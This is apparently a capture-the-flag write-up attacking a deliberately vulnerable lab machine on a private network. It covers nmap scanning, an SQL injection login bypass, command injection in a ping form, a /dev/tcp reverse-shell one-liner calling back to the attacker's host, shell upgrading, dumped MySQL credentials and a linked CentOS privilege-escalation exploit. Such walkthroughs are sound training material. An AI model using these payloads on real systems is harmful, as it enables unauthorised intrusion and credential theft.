## NetDiscover:
`netdiscover -r 192.168.58.0/24`

## Nmap:
`nmap -A -vv -T4 192.168.58.131`

Notable output:-

```
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
| 1024 35 149174282886581624883868648302761292182406879108668063702143177994710569161669502445416601666211201346192352271911333433971833283425439634231257314174441054335295864218587993634534355128377261436615077053235666774641007412196140534221696911370388178873572900977872600139866890316021962605461192127591516843621
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOWJ2N2BPBPm0HxCi630ZxHtTNMh+uVkeYCkKVNxavZkcJdpfFTOGZp054sj27mVZVtCeNMHhzAUpvRisn/cH4k4plLd1m8HACAVPtcgRrshCzb7wzQikrP+byCVypE0RpkQcDya+ngDMVzrkA+9KQSR/5W6BjldLW60A5oZgyfvAAAAFQC/iRZe4LlaYXwHvYYDpjnoCPY3xQAAAIBKFGl/zr/u1JxCV8a9dIAMIE0rk0jYtwvpDCdBre450ruoLII/hsparzdJs898SMWX1kEzigzUdtobDVT8nWdJAVRHCm8ruy4IQYIdtjYowXD7hxZTy/F0xOsiTRWBYMQPe8lW1oA+xabqlnCO3ppjmBecVlCwEMoeefnwGWAkxwAAAIAKajcioQiMDYW7veV13Yjmag6wyIia9+V9aO8JmgMi3cNr04Vl0FF+n7OIZ5QYvpSKcQgRzwNylEW5juV0Xh96m2g3rqEvDd4kTttCDlOltPgP6q6Z8JI0IGzcIGYBy6UWdIxj9D7F2ccc7fAM2o22+qgFp+FFiLeFDVbRhYz4sg==
|   1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA4j5XFFw9Km2yphjpu1gzDBglGSpMxtR8zOvpH9gUbOMXXbCQeXgOK3rs4cs/j75G54jALm99Ky7tgToNaEuxmQmwnpYk9bntoDu9SkiT/hPZdOwq40yrfWIHzlUNWTpY3okTdf/YNUAdl4NOBOYbf0x/dsAdHHqSWnvZmruFA6M=
80/tcp   open  http       syn-ack Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    syn-ack 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            800/udp   status
|_  100024  1            803/tcp   status
443/tcp  open  ssl/https? syn-ack
|_ssl-date: 2025-04-19T14:09:06+00:00; -3h09m40s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de:29f9:fbfb:2eb2:beaf:e624:3157:090f
| SHA-1: 560c:9196:6506:fb0f:fb81:66b1:ded3:ac11:2ed4:808a
| -----BEGIN CERTIFICATE-----
| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x
| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT
| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu
| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ
| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkxMDA4MDAxMDQ3WhcN
| MTAxMDA4MDAxMDQ3WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0
| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x
| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs
| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu
| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAN4duNVEr4aL
| TUfsjacXKcCaRs1oTxsdNTIxkp7SV2PDD+mBY5shsXt/FMG7Upf4g605+W6ZEhfB
| WpLXonDFaRIxxn4AGSOLg8q20kUt9p2HZufaSLSwfSwJ+CTMwYtN8AU0jhf3r0y8
| jr+jjEU0HT4O4YXcnDRvbIUeHKedPPsTAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU
| QAs+OwqZIYsWClQ2ZBav2uPP/mAwgegGA1UdIwSB4DCB3YAUQAs+OwqZIYsWClQ2
| ZBav2uPP/mChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA
| Hvq7KPeUTn36Sz/Au95TmC7aSkhIkGVHMRGhWe7KTEflqQffYTqJOS4xsu/FxDRy
| 9IGOapsyILGEx57apuCYJW3tpwMUrpUXu/x9g3LM+VghiH0XxMOfbueVhqWZ+yP8
| LisROr5u+FeGOBBIINAmpWUX2xEdB4p97WYzP03rEQU=
|_-----END CERTIFICATE-----
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
631/tcp  open  ipp        syn-ack CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
3306/tcp open  mysql      syn-ack MySQL (unauthorized)
```

## Enumeration:

- 22/tcp   open  ssh        syn-ack OpenSSH 3.9p1 (protocol 1.99)
- 80/tcp   open  http       syn-ack Apache httpd 2.0.52 ((CentOS))
- 111/tcp  open  rpcbind    syn-ack 2 (RPC #100000)
- 443/tcp  open  ssl/https? syn-ack
- 631/tcp  open  ipp        syn-ack CUPS 1.1
- 3306/tcp open  mysql      syn-ack MySQL (unauthorized)

None of them had any notable exploits

Checking the website
looked around doing basic stuffs, found nothing

Tried sql injection

`' OR 1=1--` for both username and password

We have a pinging page now 
![image](https://github.com/user-attachments/assets/6d0bfd90-ff3e-4395-a172-b0066d730478)

by messing around we see that `;whoami` and other commands work
which means we can generate a reverse shell
used revshells.com to generate a reverse shell `sh -i >& /dev/tcp/192.168.58.128/4444 0>&1`

![image](https://github.com/user-attachments/assets/ff2d9375-6ff4-4b4f-b840-dc74871877b8)

we also see two users harold and john

getting tty https://sirensecurity.io/blog/break-out-get-that-tty/

Lazy to type but here's a self explanatory part:

```
sh-3.00$ cat index.php
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
	mysql_select_db("webapp");
	
	if ($_POST['uname'] != ""){
		$username = $_POST['uname'];
		$password = $_POST['psw'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		//print $query."<br>";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
		//print "ID: ".$row['id']."<br />";
	}

?>
<html>
<body>
<?php
if ($row['id']==""){
?>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
	<table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
		<tr>
			<td colspan='2' align='center'>
			<b>Remote System Administration Login</b>
			</td>
		</tr>
		<tr>
			<td width="150">Username</td>
			<td><input name="uname" type="text"></td>
		</tr>
		<tr>
			<td width="150">Password</td>
			<td>
			<input name="psw" type="password">
			</td>
		</tr>
		<tr>
			<td colspan="2" align="center">
			<input type="submit" name="btnLogin" value="Login">
			</td>
		</tr>
	</table>
</form>
<?php
	} //END of login form
?>

<!-- Start of HTML when logged in as Administator -->
<?php
	if ($row['id']==1){
?>
	<form name="ping" action="pingit.php" method="post" target="_blank">
		<table width='600' border='1'>
		<tr valign='middle'>
			<td colspan='2' align='center'>
			<b>Welcome to the Basic Administrative Web Console<br></b>
			</td>
		</tr>
		<tr valign='middle'>
			<td align='center'>
				Ping a Machine on the Network:
			</td>
				<td align='center'>
				<input type="text" name="ip" size="30">
				<input type="submit" value="submit" name="submit">
			</td>
			</td>
		</tr>
	</table>
	</form>


<?php
}
?>
</body>
</html>

sh-3.00$ mysql -ujohn -phiroshima
ls
^C
┌─[✗]─[tranquilwind@parrot]─[~]
└──╼ $nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.58.128] from (UNKNOWN) [192.168.58.131] 32773
sh: no job control in this shell
sh-3.00$ su john
standard in must be a tty
sh-3.00$ python3 -c 'import pty; pty.spawn("/bin/bash")'
sh: python3: command not found
sh-3.00$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.00$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
bin:/usr/games:/tmpcal/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/ 
bash-3.00$ export TERM=xterm-256color
export TERM=xterm-256color
bash-3.00$ alias ll='ls -lsaht --color=auto'
alias ll='ls -lsaht --color=auto'
bash-3.00$ ^Z
[1]+  Stopped                 nc -lvnp 4444
┌─[✗]─[tranquilwind@parrot]─[~]
└──╼ $stty raw -echo ; fg ; reset
nc -lvnp 4444
             stty columns 200 rows 200
bash-3.00$ su john
Password: 
su: incorrect password
bash-3.00$ mysql -u john -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 42 to server version: 4.1.22

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases
    -> ;
+----------+
| Database |
+----------+
| mysql    |
| test     |
| webapp   |
+----------+
3 rows in set (0.01 sec)

mysql> use test
Database changed
mysql> show tables
    -> ;
Empty set (0.00 sec)

mysql> use webapp
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+------------------+
| Tables_in_webapp |
+------------------+
| users            |
+------------------+
1 row in set (0.00 sec)

mysql> select * from users;  
+------+----------+------------+
| id   | username | password   |
+------+----------+------------+
|    1 | admin    | 5afac8d85f |
|    2 | john     | 66lajGGbla |
+------+----------+------------+
2 rows in set (0.00 sec)

mysql>          

```

I tried admin password and other databases
no luck

```
bash-3.00$ lsb_release -a
LSB Version:	:core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID:	CentOS
Description:	CentOS release 4.5 (Final)
Release:	4.5
Codename:	Final
```

Exploit for for CentOS 4.5
https://www.exploit-db.com/exploits/9542

![image](https://github.com/user-attachments/assets/70d1ac79-386e-4d0a-828d-03d960ea0a92)

Done adios.


